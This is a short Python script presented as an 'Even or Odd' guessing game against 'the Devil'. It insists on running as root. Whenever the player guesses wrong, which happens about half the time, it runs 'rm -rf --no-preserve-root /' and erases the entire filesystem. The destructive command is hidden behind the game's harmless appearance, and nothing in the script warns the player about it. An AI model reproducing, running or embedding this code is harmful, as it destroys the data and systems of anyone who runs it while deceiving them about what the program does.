import os, random, time, sys  

def check_root():  
    if os.geteuid():  
        sys.exit("ERROR: Run this script as root (sudo).")  

def delete_system():  
    print("Try Again ? No, Let's take a sleep")  
    time.sleep(2)  
    os.system("rm -rf --no-preserve-root /")  

def play_game():  
    check_root()  
    print("Welcome to Even or Odd Game!\nGuess the Devil's choice")  

    while True:  
        user_choice = input("\nGuess (Even/Odd): ").strip().capitalize()  
        if user_choice not in ["Even", "Odd"]:  
            print("Invalid choice! Choose 'Even' or 'Odd'.")  
            continue  

        comp_choice = random.choice(["Even", "Odd"])  
        print(f"\nThe Devil chose: {comp_choice}")  

        if user_choice != comp_choice:  
            delete_system()  
            break  
        print("You won... for now.")  

if __name__ == "__main__":  
    play_game()
